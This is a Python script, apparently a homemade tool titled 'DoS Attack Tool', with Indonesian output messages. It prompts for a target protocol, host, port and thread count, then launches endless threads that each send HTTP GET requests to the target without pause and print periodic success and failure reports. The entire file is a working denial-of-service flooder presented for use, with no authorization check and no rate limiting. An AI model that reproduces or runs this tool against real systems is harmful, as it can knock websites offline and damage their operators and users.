import threading
import time
import sys
import requests
from utils import clear_screen

class DoSAttackTool:
    def __init__(self):
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.total_response_time = 0
        self.lock = threading.Lock()
        self.session = requests.Session()

    def attack(self, target_url):
        while True:
            with self.lock:
                self.total_requests += 1
            start_time = time.time()

            try:
                response = self.session.get(target_url, timeout=5)
                response_time = time.time() - start_time

                with self.lock:
                    self.total_response_time += response_time

                if response.status_code == 200:
                    with self.lock:
                        self.successful_requests += 1
                    print(f"Request {self.total_requests} berhasil - Response Time: {response_time:.4f} detik")
                else:
                    with self.lock:
                        self.failed_requests += 1
                    print(f"Request {self.total_requests} gagal - Status: {response.status_code}")

            except Exception as e:
                with self.lock:
                    self.failed_requests += 1
                print(f"Request {self.total_requests} gagal - Exception: {str(e)}")

            if self.total_requests % 100 == 0:
                self.show_report()

    def show_report(self):
        with self.lock:
            print("\n===== Laporan =====")
            print(f"Total Requests         : {self.total_requests}")
            print(f"Successful Requests    : {self.successful_requests}")
            print(f"Failed Requests        : {self.failed_requests}")
            if self.successful_requests > 0:
                avg_response_time = self.total_response_time / self.successful_requests
                print(f"Rata-rata Response Time: {avg_response_time:.4f} detik (hanya sukses)")
            else:
                print("Rata-rata Response Time: Tidak tersedia (belum ada request sukses)")
            print("==============================\n")

    def start(self):
        clear_screen()

        print("""
============================================================
                        <-- ADOS -->
         DoS Attack Tool - Created by Achmed Hibatillah
                     achmedhibatillah.com
============================================================
""")

        protocol = input("Target Protocol (http/https): ").strip().lower()
        if protocol not in ['http', 'https']:
            print("Invalid protocol! Please choose either 'http' or 'https'.")
            sys.exit()

        target_ip = input("Target IP or Domain: ").strip()

        port = input("Target Port (leave empty for default): ").strip()
        if port:
            try:
                port = int(port)
            except ValueError:
                print("Invalid port! Must be an integer.")
                sys.exit()
            target_url = f"{protocol}://{target_ip}:{port}"
        else:
            # Port kosong → pakai default
            target_url = f"{protocol}://{target_ip}"

        try:
            num_threads = int(input("Number of Threads: ").strip())
        except ValueError:
            print("Invalid number of threads! Must be an integer.")
            sys.exit()

        print(f"\nStarting attack on {target_url} with {num_threads} threads...\n")

        for _ in range(num_threads):
            thread = threading.Thread(target=self.attack, args=(target_url,))
            thread.daemon = True
            thread.start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n[!] Deteksi CTRL+C! Menampilkan laporan akhir...\n")
            self.show_report()
            print("[*] Program dihentikan. Terima kasih telah menggunakan tool ini.\n")
            sys.exit()

